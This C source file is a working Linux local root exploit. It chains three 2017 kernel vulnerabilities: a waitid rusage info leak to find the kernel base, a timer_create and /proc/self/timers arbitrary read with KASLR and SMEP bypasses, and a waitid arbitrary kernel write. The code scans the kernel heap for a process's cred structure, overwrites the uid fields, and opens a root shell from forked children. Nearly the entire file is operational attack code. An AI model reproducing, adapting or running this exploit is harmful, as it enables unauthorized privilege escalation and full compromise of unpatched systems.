#define _GNU_SOURCE

#include <assert.h>
#include <ctype.h>
#include <fcntl.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/sysinfo.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <pthread.h>
#include <sys/resource.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <errno.h>

/* Arbitrary kernel read - CVE-2017-18344
 * https://seclists.org/oss-sec/2018/q3/93
 * The timer_create syscall implementation in kernel/time/posix-timers.c in
 * the Linux kernel before 4.14.8 doesn't properly validate the
 * sigevent->sigev_notify field, which leads to out-of-bounds access in the
 * show_timer function (called when /proc/$PID/timers is read). This allows
 * userspace applications to read arbitrary kernel memory (on a kernel built
 * with CONFIG_POSIX_TIMERS and CONFIG_CHECKPOINT_RESTORE).
 * Includes KASLR and SMEP bypasses. No SMAP bypass.
 * No support for 1 GB pages or 5 level page tables.
 */

#define min(x, y) ((x) < (y) ? (x) : (y))

#define PAGE_SHIFT		12
#define PAGE_SIZE		(1ul << PAGE_SHIFT)
#define PAGE_MASK		(~(PAGE_SIZE - 1))

#define HUGE_PAGE_SHIFT		21
#define HUGE_PAGE_SIZE		(1ul << HUGE_PAGE_SHIFT)
#define HUGE_PAGE_MASK		(~(HUGE_PAGE_SIZE - 1))

#define TASK_SIZE		(1ul << 47)

#define MIN_KERNEL_BASE 0xffffffff81000000ul
#define MAX_KERNEL_BASE 0xffffffffff000000ul
#define MAX_KERNEL_IMAGE 0x8000000ul // 128 MB

#define MMAP_ADDR_SPAN (MAX_KERNEL_BASE - MIN_KERNEL_BASE + MAX_KERNEL_IMAGE)
#define MMAP_ADDR_START 0x200000000ul
#define MMAP_ADDR_END (MMAP_ADDR_START + MMAP_ADDR_SPAN)

#define OPTIMAL_PTR_OFFSET ((MMAP_ADDR_START - MIN_KERNEL_BASE) / 8)
// == 0x4fe00000

#define MAX_MAPPINGS 1024
#define MEMFD_SIZE (MMAP_ADDR_SPAN / MAX_MAPPINGS)

static struct proc_reader g_proc_reader;
static unsigned long g_leak_ptr_addr = 0;

#define PROC_INITIAL_SIZE 1024
#define PROC_CHUNK_SIZE 1024

struct proc_reader {
	char *buffer;
	int buffer_size;
	int read_size;
};

static void proc_ensure_size(struct proc_reader* pr, int size) {
	if (pr->buffer_size >= size)
		return;
	while (pr->buffer_size < size)
		pr->buffer_size <<= 1;
	pr->buffer = realloc(pr->buffer, pr->buffer_size);
	if (pr->buffer == NULL) {
		perror("[-] proc_ensure_size: realloc()");
		exit(EXIT_FAILURE);
	}
}

static int proc_read(struct proc_reader* pr, const char *file) {
	int fd = open(file, O_RDONLY);
	if (fd == -1) {
		perror("[-] proc_read: open()");
		exit(EXIT_FAILURE);
	}

	pr->read_size = 0;
	while (true) {
		proc_ensure_size(pr, pr->read_size + PROC_CHUNK_SIZE);
		int bytes_read = read(fd, &pr->buffer[pr->read_size],
					PROC_CHUNK_SIZE);
		if (bytes_read == -1) {
			perror("[-] read(proc)");
			exit(EXIT_FAILURE);
		}
		pr->read_size += bytes_read;
		if (bytes_read < PROC_CHUNK_SIZE)
			break;
	}

	close(fd);
	return pr->read_size;
}

typedef union k_sigval {
	int sival_int;
	void *sival_ptr;
} k_sigval_t;

#define __ARCH_SIGEV_PREAMBLE_SIZE	(sizeof(int) * 2 + sizeof(k_sigval_t))
#define SIGEV_MAX_SIZE	64
#define SIGEV_PAD_SIZE	((SIGEV_MAX_SIZE - __ARCH_SIGEV_PREAMBLE_SIZE) \
				/ sizeof(int))

typedef struct k_sigevent {
	k_sigval_t sigev_value;
	int sigev_signo;
	int sigev_notify;
	union {
		int _pad[SIGEV_PAD_SIZE];
		int _tid;

		struct {
			void (*_function)(sigval_t);
			void *_attribute;
		} _sigev_thread;
	} _sigev_un;
} k_sigevent_t;

static void leak_parse(char *in, int in_len, char **start, char **end) {
	const char *needle = "notify: ";
	*start = memmem(in, in_len, needle, strlen(needle));
	assert(*start != NULL);
	*start += strlen(needle);

	assert(in_len > 0);
	assert(in[in_len - 1] == '\n');
	*end = &in[in_len - 2];
	while (*end > in && **end != '\n')
		(*end)--;
	assert(*end > in);
	while (*end > in && **end != '/')
		(*end)--;
	assert(*end > in);
	assert((*end)[1] = 'p' && (*end)[2] == 'i' && (*end)[3] == 'd');

	assert(*end >= *start);
}

static void leak_once(char **start, char **end) {
	int read_size = proc_read(&g_proc_reader, "/proc/self/timers");
	leak_parse(g_proc_reader.buffer, read_size, start, end);
}

static int leak_once_and_copy(char *out, int out_len) {
	assert(out_len > 0);

	char *start, *end;
	leak_once(&start, &end);

	int size = min(end - start, out_len);
	memcpy(out, start, size);

	if (size == out_len)
		return size;

	out[size] = 0;
	return size + 1;
}

static void leak_range(unsigned long addr, size_t length, char *out) {
	size_t total_leaked = 0;
	while (total_leaked < length) {
		unsigned long addr_to_leak = addr + total_leaked;
		*(unsigned long *)g_leak_ptr_addr = addr_to_leak;
		int leaked = leak_once_and_copy(out + total_leaked,
			length - total_leaked);
		total_leaked += leaked;
	}
}

static void mmap_fixed(unsigned long addr, size_t size) {
	void *rv = mmap((void *)addr, size, PROT_READ | PROT_WRITE,
			MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (rv != (void *)addr) {
		perror("[-] mmap()");
		exit(EXIT_FAILURE);
	}
}

static void mmap_fd_over(int fd, unsigned long fd_size, unsigned long start,
			unsigned long end) {
	int page_size = PAGE_SIZE;
	assert(fd_size % page_size == 0);
	assert(start % page_size == 0);
	assert(end % page_size == 0);
	assert((end - start) % fd_size == 0);

	unsigned long addr;
	for (addr = start; addr < end; addr += fd_size) {
		void *rv = mmap((void *)addr, fd_size, PROT_READ,
				MAP_FIXED | MAP_PRIVATE, fd, 0);
		if (rv != (void *)addr) {
			perror("[-] mmap()");
			exit(EXIT_FAILURE);
		}
	}
}

static void remap_fd_over(int fd, unsigned long fd_size, unsigned long start,
			unsigned long end) {
	int rv = munmap((void *)start, end - start);
	if (rv != 0) {
		perror("[-] munmap()");
		exit(EXIT_FAILURE);
	}
	mmap_fd_over(fd, fd_size, start, end);
}

#define MEMFD_CHUNK_SIZE 0x1000

static int create_filled_memfd(const char *name, unsigned long size,
				unsigned long value) {
	int i;
	char buffer[MEMFD_CHUNK_SIZE];
	assert(size % MEMFD_CHUNK_SIZE == 0);

	int fd = syscall(SYS_memfd_create, name, 0);
	if (fd < 0) {
		perror("[-] memfd_create()");
		exit(EXIT_FAILURE);
	}

	for (i = 0; i < sizeof(buffer) / sizeof(value); i++)
		*(unsigned long *)&buffer[i * sizeof(value)] = value;

	for (i = 0; i < size / sizeof(buffer); i++) {
		int bytes_written = write(fd, &buffer[0], sizeof(buffer));
		if (bytes_written != sizeof(buffer)) {
			perror("[-] write(memfd)");
			exit(EXIT_FAILURE);
		}
	}

	return fd;
}

static const char *evil = "evil";
static const char *good = "good";

static bool bisect_probe() {
	char *start, *end;
	leak_once(&start, &end);
	return *start == 'g';
}

static unsigned long bisect_via_memfd(unsigned long fd_size,
				unsigned long start, unsigned long end) {
	assert((end - start) % fd_size == 0);

	int fd_evil = create_filled_memfd("evil", fd_size, (unsigned long)evil);
	int fd_good = create_filled_memfd("good", fd_size, (unsigned long)good);

	unsigned long left = 0;
	unsigned long right = (end - start) / fd_size;

	while (right - left > 1) {
		unsigned long middle = left + (right - left) / 2;
		remap_fd_over(fd_evil, fd_size, start + left * fd_size,
				start + middle * fd_size);
		remap_fd_over(fd_good, fd_size, start + middle * fd_size,
				start + right * fd_size);
		bool probe = bisect_probe();
		if (probe)
			left = middle;
		else
			right = middle;
	}

	int rv = munmap((void *)start, end - start);
	if (rv != 0) {
		perror("[-] munmap()");
		exit(EXIT_FAILURE);
	}

	close(fd_evil);
	close(fd_good);

	return start + left * fd_size;
}

static unsigned long bisect_via_assign(unsigned long start, unsigned long end) {
	int word_size = sizeof(unsigned long);

	assert((end - start) % word_size == 0);
	assert((end - start) % PAGE_SIZE == 0);

	mmap_fixed(start, end - start);

	unsigned long left = 0;
	unsigned long right = (end - start) / word_size;

	while (right - left > 1) {
		unsigned long middle = left + (right - left) / 2;
		unsigned long a;
		for (a = left; a < middle; a++)
			*(unsigned long *)(start + a * word_size) =
				(unsigned long)evil;
		for (a = middle; a < right; a++)
			*(unsigned long *)(start + a * word_size) =
				(unsigned long)good;
		bool probe = bisect_probe();
		if (probe)
			left = middle;
		else
			right = middle;
	}

	int rv = munmap((void *)start, end - start);
	if (rv != 0) {
		perror("[-] munmap()");
		exit(EXIT_FAILURE);
	}

	return start + left * word_size;
}

static unsigned long bisect_leak_ptr_addr() {
	unsigned long addr = bisect_via_memfd(MEMFD_SIZE, MMAP_ADDR_START, MMAP_ADDR_END);
	addr = bisect_via_memfd(PAGE_SIZE, addr, addr + MEMFD_SIZE);
	addr = bisect_via_assign(addr, addr + PAGE_SIZE);
	return addr;
}

static void arbitrary_read_init() {
	printf("[.] setting up proc reader\n");
	struct proc_reader* pr = &g_proc_reader;
	pr->buffer = malloc(1024);
	if (pr->buffer == NULL) {
		perror("[-] proc_init: malloc()");
		exit(EXIT_FAILURE);
	}
	pr->buffer_size = 1024;
	pr->read_size = 0;
	printf("[~] done\n");

	printf("[.] setting up timer\n");
	k_sigevent_t se;
	memset(&se, 0, sizeof(se));
	se.sigev_signo = SIGRTMIN;
	se.sigev_notify = OPTIMAL_PTR_OFFSET;
	timer_t timerid = 0;

	int rv = syscall(SYS_timer_create, CLOCK_REALTIME,(void *)&se, &timerid);
	if (rv != 0) {
		perror("[-] timer_create()");
		exit(EXIT_FAILURE);
	}
	printf("[~] done\n");

	printf("[.] finding leak pointer address\n");
	g_leak_ptr_addr = bisect_leak_ptr_addr();
	printf("[+] done: %016lx\n", g_leak_ptr_addr);

	printf("[.] mapping leak pointer page\n");
	mmap_fixed(g_leak_ptr_addr & ~(PAGE_SIZE - 1), PAGE_SIZE);
	printf("[~] done\n");
}


/* -------- */

/* Arbitrary kernel write - CVE-2017-5123
 * waitid uses unsafe_put_user without checking access_ok,
 * allowing the user to give a kernel address for infop and write over kernel memory.
 * when given invalid parameters this just writes the following 32 bit integers
 * 0, 0, 0, _, 0, 0, 0
 * (the 4th element is unchanged)
 */

int kern_write(unsigned long addr) {
	return waitid(P_PID, 0, addr, WEXITED | WSTOPPED | WCONTINUED);
}

static int *glob_var;

/* Unusued function, alternative method to find the kernel base (it's more invasive)
// where read/write data is in kernel
// had to play with last 3 nibbles to get it to not crash
#define start_rw_off 0x9f5fe0

unsigned long get_base() {
  // first we try doing our arb write to find the system base address
  // if syscall is 0 we didn't fault
  unsigned long start = 0xffffffff00000000;
  unsigned long inc =   0x0000000000100000;
  unsigned long guess = start;
  while (guess != 0) {
    int res = waitid(P_ALL, 0, guess+start_rw_off, WEXITED);
    if (errno != 14) {
      printf("found kernel base 0x%lx\n", guess);
      return guess;
    }
    
    guess += inc;
  }
  printf("failed to find base address...");
  return -1;
}
*/

unsigned long find_kernel_heap(unsigned long kernel_base) {
	printf("Looking for kernel heap..\n");
	//Predicting probable start address
	unsigned long curr_guess = kernel_base - 0x800000000000;
	bool found_kernel_heap = false;
	pthread_t tid;
	while(!found_kernel_heap) {
		curr_guess += 0x1000000;
		//printf("Trying %p\n", curr_guess);
		// try writing
		int res = kern_write(curr_guess);
		if (errno != 14) {
			printf("Found!!!\n");
			found_kernel_heap = true;
		}
	}
	return curr_guess;
}

/* ----- */

int main(int argc, char **argv) {
	/*
	 * Info leak, CVE-2017-14954
	 * https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-14954
	 * The waitid implementation in kernel/exit.c in the Linux kernel through 4.13.4 accesses rusage data structures
     * in unintended cases, which allows local users to obtain sensitive information, and bypass the KASLR protection
     * mechanism, via a crafted system call.
	 */
	int pid;
	struct rusage rusage = {};
	unsigned long kaddr;
	pid = fork();
	if (pid > 0) {
		syscall(__NR_waitid, P_PID, pid, NULL, WEXITED|WNOHANG|__WNOTHREAD, &rusage);
		printf("Leak size=%d bytes\n", sizeof(rusage));
		kaddr = rusage.ru_inblock & ~0xfffff;
		printf("Kernel base: 0x%lx\n", kaddr);
		glob_var = mmap(NULL, sizeof *glob_var, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
		*glob_var = 0;
		
		unsigned long kernel_base = kaddr; //get_base();
		unsigned long kernel_heap_off = 4;

		unsigned long kernel_heap_start = find_kernel_heap(kernel_base) + 0x10a0b140;
		printf("Found kernel heap @ %p\n", kernel_heap_start);

		printf("Forking..\n");  
		int j = 0;
		  for (j = 0; j < 1000; j++) {
		    int pid = fork();
		    if (pid == 0) { //If I'm the child..
		      while(1) {
			if (*glob_var == 1) exit(0);

			if (getuid() == 0) {
			  *glob_var = 1;
			  printf("I'm ROOT!!!\n");
			  system("sh");
			}
			sleep(5);
		      }
		    }
		  }

		arbitrary_read_init();

		printf("Looking for process creds in the kernel heap.. @ %p\n", kernel_heap_start);
		unsigned long addr = 0;
		  for (addr = kernel_heap_start; (*glob_var == 0) && (addr < (kernel_heap_start + (kernel_heap_off * 100000000))); addr+=kernel_heap_off) {

			unsigned char buffer[10];
			leak_range(addr, 10, buffer);

			int i = 0;
			if ((buffer[0] == 0xe8) && (buffer[1] == 0x03) && // uid == 1000
				(buffer[2] == 0) && (buffer[3] == 0) &&
				(buffer[4] == 0xe8) && (buffer[5] == 0x03) &&
				(buffer[6] == 0) && (buffer[7] == 0) &&
				(buffer[8] == 0xe8) && (buffer[9] == 0x03)) {
			printf("cred->uid found! @ %p\nOverwriting new creds...\n", addr);
			kern_write(addr);
			//break;
			}
		  }
		printf("Done!\n");
		sleep(1000);

	} else if (pid == 0) {
		sleep(10000);
		exit(0);
	}
	return 0;
}
